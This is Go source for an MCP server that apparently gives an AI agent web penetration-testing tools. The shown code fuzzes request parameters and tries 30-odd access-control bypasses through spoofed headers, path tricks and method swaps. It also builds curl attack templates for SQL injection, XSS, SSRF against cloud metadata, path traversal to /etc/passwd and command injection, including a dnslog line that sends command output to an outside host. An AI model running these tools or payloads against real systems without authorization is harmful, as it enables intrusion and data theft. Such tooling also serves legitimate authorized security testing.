		paramName = "fuzz"
	}
	concurrency := int(getArgFloat(args, "concurrency", 5))
	if concurrency > 20 {
		concurrency = 20
	}
	client := &http.Client{Timeout: 10 * time.Second}
	type result struct {
		Payload string `json:"payload"`
		Status  int    `json:"status"`
		Size    int    `json:"size"`
		Delta   bool   `json:"delta"`
	}
	// baseline
	baseReq, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
	baseResp, err := client.Do(baseReq)
	var baseSize int
	var baseStatus int
	if err == nil {
		baseBody, _ := io.ReadAll(io.LimitReader(baseResp.Body, 4096))
		baseSize = len(baseBody)
		baseStatus = baseResp.StatusCode
		baseResp.Body.Close()
	}
	var (
		wg   sync.WaitGroup
		mu   sync.Mutex
		hits []result
		sem  = make(chan struct{}, concurrency)
	)
	for _, w := range wordlist {
		wg.Add(1)
		sem <- struct{}{}
		go func(w string) {
			defer wg.Done()
			defer func() { <-sem }()
			var (
				u     = target
				meth  = "GET"
				body  io.Reader
				ctype string
			)
			switch paramLoc {
			case "query":
				pu, _ := url.Parse(target)
				q := pu.Query()
				q.Set(paramName, w)
				pu.RawQuery = q.Encode()
				u = pu.String()
			case "body":
				// POST the fuzz value as a form-encoded body parameter.
				meth = "POST"
				ctype = "application/x-www-form-urlencoded"
				body = strings.NewReader(url.Values{paramName: {w}}.Encode())
			}
			req, err := http.NewRequestWithContext(ctx, meth, u, body)
			if err != nil {
				return
			}
			if ctype != "" {
				req.Header.Set("Content-Type", ctype)
			}
			if paramLoc == "header" {
				req.Header.Set(paramName, w)
			}
			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()
			rb, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
			status := resp.StatusCode
			size := len(rb)
			delta := status != baseStatus || abs(size-baseSize) > 50
			if delta {
				mu.Lock()
				hits = append(hits, result{Payload: w, Status: status, Size: size, Delta: true})
				mu.Unlock()
			}
		}(w)
	}
	wg.Wait()
	jb, _ := json.Marshal(map[string]interface{}{
		"target":      target,
		"param":       paramName,
		"loc":         paramLoc,
		"baseline":    map[string]int{"status": baseStatus, "size": baseSize},
		"fuzz_count":  len(wordlist),
		"hits":        hits,
	})
	return textR(string(jb))
}

// auth_bypass_check 改 method / 加 header / 改 path 后缀,试越权绕过。
func auth_bypass_check(ctx context.Context, args map[string]interface{}) toolCallResult {
	target, _ := args["url"].(string)
	if target == "" {
		return errR("url required")
	}
	headers, _ := args["headers"].(map[string]interface{})
	cookies, _ := args["cookies"].(map[string]interface{})

	parsed, _ := url.Parse(target)
	originalPath := parsed.Path

	type trial struct {
		Method string
		Path   string
		Extra  map[string]string
		Note   string
	}
	trials := []trial{
		{"GET", originalPath, nil, "baseline (with provided creds)"},
		{"GET", originalPath + "/", nil, "trailing slash"},
		{"GET", originalPath + ".json", nil, "json ext"},
		{"GET", originalPath + "%2e", nil, "url-encoded dot"},
		{"GET", originalPath + "%20", nil, "url-encoded space"},
		{"GET", originalPath + "%00", nil, "null byte"},
		{"GET", originalPath + "..;/", nil, "path traversal (CVE-2018-11759 style)"},
		{"GET", "//" + parsed.Host + originalPath, nil, "double-slash host"},
		{"GET", originalPath, map[string]string{"X-Original-URL": originalPath}, "X-Original-URL override"},
		{"GET", originalPath, map[string]string{"X-Rewrite-URL": originalPath}, "X-Rewrite-URL override"},
		{"HEAD", originalPath, nil, "method HEAD"},
		{"POST", originalPath, nil, "method POST (empty body)"},
		{"OPTIONS", originalPath, nil, "method OPTIONS"},
		{"PUT", originalPath, nil, "method PUT (empty body)"},
		{"PATCH", originalPath, nil, "method PATCH"},
		{"DELETE", originalPath, nil, "method DELETE"},
		{"GET", originalPath, map[string]string{"X-Forwarded-For": "127.0.0.1"}, "XFF 127.0.0.1"},
		{"GET", originalPath, map[string]string{"X-Forwarded-For": "8.8.8.8"}, "XFF 8.8.8.8"},
		{"GET", originalPath, map[string]string{"X-Real-IP": "127.0.0.1"}, "X-Real-IP 127.0.0.1"},
		{"GET", originalPath, map[string]string{"X-Custom-IP-Authorization": "127.0.0.1"}, "X-Custom-IP-Auth"},
		{"GET", originalPath, map[string]string{"X-Originating-IP": "127.0.0.1"}, "X-Originating-IP"},
		{"GET", originalPath, map[string]string{"X-Remote-IP": "127.0.0.1"}, "X-Remote-IP"},
		{"GET", originalPath, map[string]string{"X-Client-IP": "127.0.0.1"}, "X-Client-IP"},
		{"GET", originalPath, map[string]string{"X-Host": "127.0.0.1"}, "X-Host"},
		{"GET", originalPath, map[string]string{"X-Forwarded-Host": "127.0.0.1"}, "X-Forwarded-Host"},
		{"GET", "/admin", nil, "probe /admin (无认证)"},
		{"GET", originalPath, map[string]string{"Host": "127.0.0.1"}, "Host override"},
		{"GET", originalPath, map[string]string{"Host": "localhost"}, "Host localhost"},
	}

	type outcome struct {
		Trial  string `json:"trial"`
		Method string `json:"method"`
		Path   string `json:"path"`
		Status int    `json:"status"`
		Size   int    `json:"size"`
		Note   string `json:"note"`
	}
	client := &http.Client{
		Timeout: 8 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: getArgBool(args, "insecure", false)},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	// baseline
	buildReq := func(t trial) *http.Request {
		u2 := *parsed
		// Keep the literal path, including a leading "//" for the
		// double-slash host-confusion trial — net/http sends it as the
		// request-target verbatim, which is the point of that test.
		u2.Path = t.Path
		req, _ := http.NewRequest(t.Method, u2.String(), nil)
		for k, v := range headers {
			req.Header.Set(k, fmt.Sprintf("%v", v))
		}
		for k, v := range cookies {
			req.AddCookie(&http.Cookie{Name: k, Value: fmt.Sprintf("%v", v)})
		}
		for k, v := range t.Extra {
			// Host must be set on req.Host — net/http ignores Header["Host"].
			if strings.EqualFold(k, "Host") {
				req.Host = v
				continue
			}
			req.Header.Set(k, v)
		}
		if req.Header.Get("User-Agent") == "" {
			req.Header.Set("User-Agent", "Mozilla/5.0 webhunter/1.0")
		}
		return req
	}
	baseReq := buildReq(trials[0])
	baseResp, err := client.Do(baseReq)
	var baseSize int
	var baseStatus int
	if err == nil {
		body, _ := io.ReadAll(io.LimitReader(baseResp.Body, 4096))
		baseSize = len(body)
		baseStatus = baseResp.StatusCode
		baseResp.Body.Close()
	}
	var results []outcome
	for _, t := range trials {
		req := buildReq(t)
		resp, err := client.Do(req)
		if err != nil {
			results = append(results, outcome{Trial: t.Note, Method: t.Method, Path: t.Path, Status: -1, Note: err.Error()})
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()
		results = append(results, outcome{Trial: t.Note, Method: t.Method, Path: t.Path, Status: resp.StatusCode, Size: len(body)})
	}
	jb, _ := json.Marshal(map[string]interface{}{
		"target":   target,
		"baseline": map[string]int{"status": baseStatus, "size": baseSize},
		"results":  results,
		"hint":     "找 status=200 且 size 接近 baseline 的 = 可能绕过;找 status 跟 baseline 差异大的 = 触发了不同逻辑",
	})
	return textR(string(jb))
}

// poc_scaffold 给定漏洞类型生成 PoC 骨架(curl/python)。AI 自己改 payload。
func poc_scaffold(ctx context.Context, args map[string]interface{}) toolCallResult {
	vulnType, _ := args["vuln_type"].(string)
	url, _ := args["url"].(string)
	method, _ := args["method"].(string)
	if method == "" {
		method = "GET"
	}
	body, _ := args["body"].(string)
	headers, _ := args["headers"].(map[string]interface{})

	var tpl string
	switch strings.ToLower(vulnType) {
	case "sqli", "sql-injection":
		tpl = `# SQLi PoC scaffold (manual, NOT sqlmap)
# 1. 加 ' OR 1=1-- 看响应长度变化
# 2. UNION SELECT 1,2,3,4,5 猜列数
# 3. 改 union select null,null,... 试探
# 4. 用 information_schema 查表名/字段
curl -X %s '%s%s' \\
  -H 'User-Agent: Mozilla/5.0' \\
  -H 'X-Forwarded-For: 127.0.0.1' \\
  --data '%s' \\
  -i
`
		tpl = fmt.Sprintf(tpl, method, url, "'%20OR%201=1--", body)
	case "xss":
		tpl = `# XSS PoC scaffold
# 1. 反射型: 直接弹 payload 看是否回显未过滤
# 2. 存储型: 提交到后端,再访问展示页
# 3. DOM 型: 看 #/onload 之类
curl -X %s '%s' \\
  -H 'User-Agent: <svg/onload=alert(1)>' \\
  --data '%s' \\
  -i
`
		tpl = fmt.Sprintf(tpl, method, url, body)
	case "ssrf":
		tpl = `# SSRF PoC scaffold
# 1. 改 url 为 http://127.0.0.1/ 测内网
# 2. 改 http://169.254.169.254/ 测云元数据
# 3. file:///etc/passwd
# 4. gopher:// 内网服务打协议
curl -X %s '%s' \\
  --data '%s' \\
  -i
`
		tpl = fmt.Sprintf(tpl, method, url, body)
	case "rce", "command-injection":
		tpl = `# RCE PoC scaffold
# 1. 改 cmd 为 ;id / |id / $(id) / $(id) 测命令拼接
# 2. sleep 5 看响应延迟
# 3. dnslog 验证 (curl http://xxx.dnslog.cn/$(id))
curl -X %s '%s' \\
  --data '%s' \\
  -i
`
		tpl = fmt.Sprintf(tpl, method, url, body)
	case "lfi", "file-read":
		tpl = `# LFI / path traversal PoC scaffold
# 1. ../../../../etc/passwd
# 2. ....//....//etc/passwd (双写绕过)
# 3. /etc/passwd (绝对路径)
# 4. file:///etc/passwd
# 5. php filter: php://filter/convert.base64-encode/resource=index.php
curl -X %s '%s' \\
  -i
`
		tpl = fmt.Sprintf(tpl, method, url)
	case "auth-bypass", "unauth":
		tpl = `# Auth bypass PoC scaffold
# 1. 删 Authorization / Cookie 看是否 200
# 2. 改 cookie user=admin / role=admin
# 3. 改 /admin -> /Admin /ADMIN 大小写
# 4. 改 /admin/ -> /admin.json 后缀
# 用 webhunter.auth_bypass_check 自动试常见绕过
curl -X %s '%s' -i
`
		tpl = fmt.Sprintf(tpl, method, url)
	case "idor":
		tpl = `# IDOR PoC scaffold
# 1. 拿两个不同 user 的 token
# 2. userA 的 token 请求 userB 的 resource id
# 3. 改 id 顺序: 1, 2, 3, 100, 9999
# 用 webhunter.api_fuzz 自动化 ID 替换
curl -X %s '%s' \\
  -H 'Authorization: Bearer <USER_A_TOKEN>' \\
  -i
`
		tpl = fmt.Sprintf(tpl, method, url)
	case "info-leak":
		tpl = `# Info leak PoC scaffold
# 用 webhunter.leak_creds 自动跑常见泄露 path
# 重点: .git/HEAD, .env, /actuator/env, swagger.json
curl -X %s '%s/.git/HEAD' -i
curl -X %s '%s/.env' -i
curl -X %s '%s/actuator/env' -i
`
		tpl = fmt.Sprintf(tpl, method, url, method, url, method, url)
	default:
		tpl = fmt.Sprintf(`# Generic PoC scaffold for %s
curl -X %s '%s' -i
# 用 webhunter.http_request 自由改 header / body / cookie
`, vulnType, method, url)
	}
	if headers != nil {
		hb, _ := json.Marshal(headers)
		tpl += "\n# 备注 headers (应用到你自己的脚本): " + string(hb) + "\n"
	}
	return textR(tpl)
}

// risk_score 启发式评分(可被 AI 覆盖)。
func risk_score(ctx context.Context, args map[string]interface{}) toolCallResult {
	evidence, _ := args["evidence"].(string)
	impact, _ := args["impact"].(string) // critical|high|medium|low
	if evidence == "" || impact == "" {
		return errR("evidence + impact required")
	}
	// 基础分数
	base := 0
	switch strings.ToLower(impact) {
	case "critical":
		base = 90
	case "high":
		base = 70
	case "medium":
		base = 40
	case "low":
		base = 20
	default:
		base = 30
	}
	// evidence 强度调整
	evLower := strings.ToLower(evidence)
	if strings.Contains(evLower, "rce") || strings.Contains(evLower, "remote code") {
		base += 10
	}
	if strings.Contains(evLower, "auth bypass") || strings.Contains(evLower, "unauth") {
		base += 5
	}
	if strings.Contains(evLower, "verified") || strings.Contains(evLower, "exploited") {
		base += 5
	}
	if base > 100 {
		base = 100
	}
	jb, _ := json.Marshal(map[string]interface{}{
		"impact":  impact,
		"score":   base,
		"level":   scoreLevel(base),
		"note":    "启发式;AI 应结合上下文覆盖,不要盲信",
	})
	return textR(string(jb))
}

// write_finding 把漏洞写进 dhunter 数据库 (HTTP API)。
func write_finding(ctx context.Context, args map[string]interface{}) toolCallResult {
	title, _ := args["title"].(string)
	if title == "" {
		return errR("title required")
	}
	severity, _ := args["severity"].(string)
	if severity == "" {
		severity = "medium"
	}
	target, _ := args["target"].(string)
	evidence, _ := args["evidence"].(string)
	conversationID := getArgString(args, "conversation_id", "")
	platformURL := getArgString(args, "platform_url", os.Getenv("DESREDTEAM_URL"))
	token := getArgString(args, "platform_token", os.Getenv("DESREDTEAM_TOKEN"))
	if platformURL == "" || token == "" {
		platformURL = "http://127.0.0.1:8080"
	}
	if conversationID == "" {
		cid, err := ensureConversation(ctx, platformURL, token, "webhunter")
		if err != nil {
			return errR("ensure conversation failed: " + err.Error())
		}
		conversationID = cid
	}
	payload := map[string]interface{}{
		"conversation_id": conversationID,
		"title":           title,
		"severity":        severity,
		"target":          target,
		"evidence":        evidence,
		"source":          "dhunter-mcp",
	}
	body, _ := json.Marshal(payload)
	req, _ := http.NewRequestWithContext(ctx, "POST", platformURL+"/api/vulnerabilities", bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		jb, _ := json.Marshal(map[string]interface{}{
			"local_only": true,
			"reason":     "platform unreachable: " + err.Error(),
			"payload":    payload,
		})
		return textR(string(jb))
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	jb, _ := json.Marshal(map[string]interface{}{
		"platform_status":  resp.StatusCode,
		"platform_resp":    string(respBody),
		"payload":          payload,
		"conversation_id":  conversationID,
	})
	return textR(string(jb))
}

// ensureConversation 拿或建一个 webhunter 专用的 conversation 缓存复用。
// 平台漏洞表 FK 到 conversations,所以必须先有 conversation。
// 缓存是为了避免每次都新建 conversation(每次新建会在 AI 对话列表里冒一条)。
var (
	convCacheMu sync.RWMutex
	convCache   = map[string]string{} // key: project name or token, value: conversation_id
)

func ensureConversation(ctx context.Context, baseURL, token, projectName string) (string, error) {
	convCacheMu.RLock()
	if cid, ok := convCache[token+":"+projectName]; ok && cid != "" {
		convCacheMu.RUnlock()
		// 验一下 conversation 还存在(没被删)
		if convExists(ctx, baseURL, token, cid) {
			return cid, nil
		}
		convCacheMu.Lock()
		delete(convCache, token+":"+projectName)
		convCacheMu.Unlock()
	} else {
		convCacheMu.RUnlock()
	}
	// 找项目 ID
	projectID, err := lookupProjectID(ctx, baseURL, token, projectName)
	if err != nil {
		return "", fmt.Errorf("project lookup: %w", err)
	}
	// 找一个已存在的 webhunter conversation 复用
	cid, err := findWebhunterConversation(ctx, baseURL, token, projectID)
	if err == nil && cid != "" {
		convCacheMu.Lock()
		convCache[token+":"+projectName] = cid
		convCacheMu.Unlock()
		return cid, nil
	}
	// 没有就建一个
	cid, err = createWebhunterConversation(ctx, baseURL, token, projectID, projectName)
	if err != nil {
		return "", fmt.Errorf("create conversation: %w", err)
	}
	convCacheMu.Lock()
	convCache[token+":"+projectName] = cid
	convCacheMu.Unlock()
	return cid, nil
}

func convExists(ctx context.Context, baseURL, token, cid string) bool {
	req, _ := http.NewRequestWithContext(ctx, "GET", baseURL+"/api/conversations/"+cid, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

func lookupProjectID(ctx context.Context, baseURL, token, name string) (string, error) {
	req, _ := http.NewRequestWithContext(ctx, "GET", baseURL+"/api/projects", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var pr struct {
		Projects []struct {
			ID   string `json:"id"`
			Name string `json:"name"`
		} `json:"projects"`
	}
	if err := json.Unmarshal(body, &pr); err != nil {
		return "", err
	}
	for _, p := range pr.Projects {
		if p.Name == name {
			return p.ID, nil
		}
	}
	// 没找到就建一个
	form, _ := json.Marshal(map[string]string{"name": name, "description": "webhunter 自动建项目 (AI web 渗透测试)"})
	req2, _ := http.NewRequestWithContext(ctx, "POST", baseURL+"/api/projects", bytes.NewReader(form))
	req2.Header.Set("Authorization", "Bearer "+token)
	req2.Header.Set("Content-Type", "application/json")
	resp2, err := client.Do(req2)
	if err != nil {
		return "", err
	}
	defer resp2.Body.Close()
	body2, _ := io.ReadAll(resp2.Body)
	var pj struct {
		ID string `json:"id"`
	}
	if err := json.Unmarshal(body2, &pj); err != nil {
		return "", fmt.Errorf("create project: %s", string(body2))
	}
	return pj.ID, nil
}

func findWebhunterConversation(ctx context.Context, baseURL, token, projectID string) (string, error) {
	req, _ := http.NewRequestWithContext(ctx, "GET", baseURL+"/api/conversations?project_id="+projectID+"&limit=20", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var cr struct {
		Conversations []struct {
			ID   string `json:"id"`
			Mode string `json:"mode"`
		} `json:"conversations"`
	}
	if err := json.Unmarshal(body, &cr); err == nil {
		for _, c := range cr.Conversations {
			// 找一个 mode = "webhunter" 或者 title 含 webhunter 的
			if c.Mode == "webhunter" {
				return c.ID, nil
			}
		}
	}
	return "", fmt.Errorf("no webhunter conversation found")
}

func createWebhunterConversation(ctx context.Context, baseURL, token, projectID, projectName string) (string, error) {
	form, _ := json.Marshal(map[string]interface{}{
		"title":     "WebHunter - " + projectName,
		"mode":      "webhunter",
		"project_id": projectID,
	})
	req, _ := http.NewRequestWithContext(ctx, "POST", baseURL+"/api/conversations", bytes.NewReader(form))
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("http %d: %s", resp.StatusCode, string(body))
	}
	var cj struct {
		ID string `json:"id"`
	}
	if err := json.Unmarshal(body, &cj); err != nil {
		return "", err
	}
	if cj.ID == "" {
		return "", fmt.Errorf("no id in resp: %s", string(body))
	}
	return cj.ID, nil
}

// ── 工具注册表 ──

func toolsList() []toolDef {
	headerMap := func() map[string]interface{} {
		return map[string]interface{}{"type": "object", "additionalProperties": map[string]string{"type": "string"}}
	}
	cookieMap := func() map[string]interface{} {
		return map[string]interface{}{"type": "object", "additionalProperties": map[string]string{"type": "string"}}
	}
	return []toolDef{
		{
			Name:        "fofa_search",
			Description: "FOFA 资产搜索。需要 FOFA_EMAIL/FOFA_KEY 环境变量(或 args.email/key)。query 是 FOFA 语法。",
			InputSchema: map[string]interface{}{
				"type": "object",
				"properties": map[string]interface{}{
					"query": map[string]string{"type": "string", "description": "FOFA query, e.g. domain=\"example.com\" 或 title=\"管理\""},
					"size":  map[string]string{"type": "integer", "description": "返回数量,默认 100,最大 10000"},
					"email": map[string]string{"type": "string"},
					"key":   map[string]string{"type": "string"},
				},
				"required": []string{"query"},
			},
		},
		{Name: "subfinder_enum", Description: "子域枚举(调 subfinder 二进制)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"domain":  map[string]interface{}{"type": "string"},
				"threads": map[string]interface{}{"type": "integer"},
			}, "required": []string{"domain"},
		}},
		{Name: "baidu_search", Description: "百度搜索(免登录,可能被反爬)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"query": map[string]interface{}{"type": "string"},
				"num":   map[string]interface{}{"type": "integer", "description": "返回多少条结果,默认 10"},
			}, "required": []string{"query"},
		}},
		{Name: "bing_search", Description: "Bing 搜索(国内可访问)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"query": map[string]interface{}{"type": "string"},
				"num":   map[string]interface{}{"type": "integer"},
			}, "required": []string{"query"},
		}},
		{Name: "icp_lookup", Description: "ICP 备案查询(aizhan 域名查询 / 百度搜公司名)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"keyword": map[string]interface{}{"type": "string", "description": "域名(精确) 或 公司名(粗筛)"},
			}, "required": []string{"keyword"},
		}},
		{Name: "assetfinder_enum", Description: "被动子域枚举(调 assetfinder 二进制)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"domain": map[string]string{"type": "string"},
			}, "required": []string{"domain"},
		}},
		{Name: "fetch_js", Description: "抓目标页面的 JS 资源(katana 爬 + GET 拉内容)。返回 JS URL + 源码", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"url":   map[string]string{"type": "string"},
				"depth": map[string]string{"type": "integer", "description": "爬取深度,默认 2"},
				"max":   map[string]string{"type": "integer", "description": "最多抓多少个 JS,默认 30"},
			}, "required": []string{"url"},
		}},
		{Name: "js_analyzer", Description: "解析 JS 源码,提取 URL / API 端点 / 凭证关键字(参考 AutoHunter js_analyzer)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"source": map[string]string{"type": "string", "description": "JS 源码文本"},
				"url":    map[string]string{"type": "string", "description": "来源 URL(标记用)"},
			}, "required": []string{"source"},
		}},
		{Name: "katana_crawl", Description: "爬链接(调 katana 二进制)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"url":   map[string]string{"type": "string"},
				"depth": map[string]string{"type": "integer"},
			}, "required": []string{"url"},
		}},
		{Name: "leak_creds", Description: "探测常见泄露路径(.git/.env/.DS_Store/actuator/swagger 等),返回 status=200 的命中", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"url": map[string]string{"type": "string"},
			}, "required": []string{"url"},
		}},
		{Name: "gau_history", Description: "调 gau 取 URL 历史(wayback + common crawl)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"domain": map[string]string{"type": "string"},
			}, "required": []string{"domain"},
		}},
		{Name: "wayback_history", Description: "调 waybackurls 取 wayback 历史 URL", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"domain": map[string]string{"type": "string"},
			}, "required": []string{"domain"},
		}},
		{Name: "httpx_probe", Description: "主动 HTTP 探测(调 httpx 二进制,返回 status/title/server/tech)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"target":  map[string]interface{}{"type": "string"},
				"targets": map[string]interface{}{"type": "array", "items": map[string]interface{}{"type": "string"}},
			},
		}},
		{Name: "waf_detect", Description: "启发式探测 WAF(响应头 + 关键字 + 行为差异)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"url": map[string]string{"type": "string"},
			}, "required": []string{"url"},
		}},
		{Name: "http_request", Description: "主动 HTTP 请求,支持任意 method/header/cookie/body。AI 渗透测试的瑞士军刀", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"method":  map[string]string{"type": "string"},
				"url":     map[string]string{"type": "string"},
				"headers": headerMap(),
				"cookies": cookieMap(),
				"body":    map[string]string{"type": "string"},
				"timeout": map[string]string{"type": "integer"},
				"insecure":map[string]string{"type": "boolean", "description": "Skip TLS certificate verification. Default false (verify). Set true only for self-signed targets."},
			}, "required": []string{"url"},
		}},
		{Name: "api_fuzz", Description: "参数 fuzz:在 query/body/header 上替换 wordlist,返回响应差异", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"url":         map[string]interface{}{"type": "string"},
				"param_name":  map[string]interface{}{"type": "string", "description": "要 fuzz 的参数名"},
				"param_loc":   map[string]interface{}{"type": "string", "description": "query|body|header"},
				"wordlist":    map[string]interface{}{"type": "array", "items": map[string]interface{}{"type": "string"}},
				"concurrency": map[string]interface{}{"type": "integer", "description": "并发,默认 5,最大 20"},
			}, "required": []string{"url", "wordlist"},
		}},
		{Name: "auth_bypass_check", Description: "改 method/path/header 试越权绕过。覆盖 XFF/X-Original-URL/Host override 等 30+ 试法", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"url":     map[string]string{"type": "string"},
				"headers": headerMap(),
				"cookies": cookieMap(),
			}, "required": []string{"url"},
		}},
		{Name: "poc_scaffold", Description: "按漏洞类型生成 PoC 骨架(curl)。AI 自己改 payload 再用 http_request 跑", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"vuln_type": map[string]string{"type": "string", "description": "sqli|xss|ssrf|rce|lfi|auth-bypass|idor|info-leak"},
				"url":       map[string]string{"type": "string"},
				"method":    map[string]string{"type": "string"},
				"body":      map[string]string{"type": "string"},
				"headers":   headerMap(),
			}, "required": []string{"vuln_type", "url"},
		}},
		{Name: "risk_score", Description: "启发式评分(0-100),AI 应结合上下文覆盖", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"impact":   map[string]string{"type": "string", "description": "critical|high|medium|low"},
				"evidence": map[string]string{"type": "string"},
			}, "required": []string{"impact", "evidence"},
		}},
		{Name: "write_finding", Description: "把漏洞写进 dhunter 平台数据库(/api/vulnerabilities)。需要 DESREDTEAM_TOKEN 环境变量。会自动按 project 名查 conversation_id(没建会报错)", InputSchema: map[string]interface{}{
			"type": "object", "properties": map[string]interface{}{
				"title":           map[string]interface{}{"type": "string"},
				"severity":        map[string]interface{}{"type": "string", "description": "critical|high|medium|low|info"},
				"target":          map[string]interface{}{"type": "string"},
				"evidence":        map[string]interface{}{"type": "string"},
				"project":         map[string]interface{}{"type": "string", "description": "项目名,自动查 conversation_id,默认 webhunter"},
				"conversation_id": map[string]interface{}{"type": "string", "description": "显式指定对话/项目 ID(优先)"},
			}, "required": []string{"title"},
		}},
	}
}

func callTool(ctx context.Context, name string, args map[string]interface{}) toolCallResult {
	// strip 平台加的 server 前缀("webhunter__" / "gsl5__" 等),
	// 兼容 AI 写 `webhunter__baidu_search` 和直接 `baidu_search`
	if idx := strings.Index(name, "__"); idx > 0 {
		name = name[idx+2:]
	}
	switch name {
	case "fofa_search":
		return fofa_search(ctx, args)
	case "baidu_search":
		return baidu_search(ctx, args)
	case "bing_search":
		return bing_search(ctx, args)
	case "icp_lookup":
		return icp_lookup(ctx, args)
	case "subfinder_enum":
		return subfinder_enum(ctx, args)
	case "assetfinder_enum":
		return assetfinder_enum(ctx, args)
	case "fetch_js":
		return fetch_js(ctx, args)
	case "js_analyzer":
		return js_analyzer(ctx, args)
	case "katana_crawl":
		return katana_crawl(ctx, args)
	case "leak_creds":
		return leak_creds(ctx, args)
	case "gau_history":
		return gau_history(ctx, args)
	case "wayback_history":
		return wayback_history(ctx, args)
	case "httpx_probe":
		return httpx_probe(ctx, args)
	case "waf_detect":
		return waf_detect(ctx, args)
	case "http_request":
		return http_request(ctx, args)
	case "api_fuzz":
		return api_fuzz(ctx, args)
	case "auth_bypass_check":
		return auth_bypass_check(ctx, args)
	case "poc_scaffold":
		return poc_scaffold(ctx, args)
	case "risk_score":
		return risk_score(ctx, args)
	case "write_finding":
		return write_finding(ctx, args)
	}
	return errR("unknown tool: " + name)
}

func handleJSONRPC(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	var req rpcRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, rpcResponse{
			JSONRPC: "2.0", ID: nil,
			Error: &rpcError{Code: -32700, Message: "parse error: " + err.Error()},
		})
		return
	}
	ctx := r.Context()
	var result interface{}
	var rpcErr *rpcError
	switch req.Method {
	case "initialize":
		result = map[string]interface{}{
			"protocolVersion": "2024-11-05",
			"capabilities":    map[string]interface{}{"tools": map[string]interface{}{"listChanged": false}},
			"serverInfo":      map[string]interface{}{"name": "dhunter-mcp", "version": "0.1.0"},
		}
	case "notifications/initialized":
		w.WriteHeader(http.StatusNoContent)
		return
	case "tools/list":
		result = map[string]interface{}{"tools": toolsList()}
	case "tools/call":
		name, _ := req.Params["name"].(string)
		args, _ := req.Params["arguments"].(map[string]interface{})
		if args == nil {
			args = map[string]interface{}{}
		}
		result = callTool(ctx, name, args)
	default:
		rpcErr = &rpcError{Code: -32601, Message: "method not found: " + req.Method}
	}
	writeJSON(w, http.StatusOK, rpcResponse{JSONRPC: "2.0", ID: req.ID, Result: result, Error: rpcErr})
}

func writeJSON(w http.ResponseWriter, code int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}

func authMiddleware(token string, next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Path, "/healthz") {
			next.ServeHTTP(w, r)
			return
		}
		h := r.Header.Get("Authorization")
		if h == "" {
			http.Error(w, "missing Authorization", http.StatusUnauthorized)
			return
		}
		got := strings.TrimSpace(strings.TrimPrefix(h, "Bearer "))
		if got != token {
			http.Error(w, "bad token", http.StatusUnauthorized)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func handleHealthz(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, 200, map[string]interface{}{"status": "ok", "service": "dhunter-mcp", "ts": time.Now().Format(time.RFC3339)})
}

// ── 工具函数 ──

func getArgString(args map[string]interface{}, key, def string) string {
	if v, ok := args[key].(string); ok && v != "" {
		return v
	}
	return def
}
func getArgFloat(args map[string]interface{}, key string, def float64) float64 {
	if v, ok := args[key].(float64); ok {
		return v
	}
	return def
}

func getArgBool(args map[string]interface{}, key string, def bool) bool {
	if v, ok := args[key].(bool); ok {
		return v
	}
	return def
}

func dedupNonEmpty(ss []string) []string {
	seen := map[string]struct{}{}
	out := make([]string, 0, len(ss))
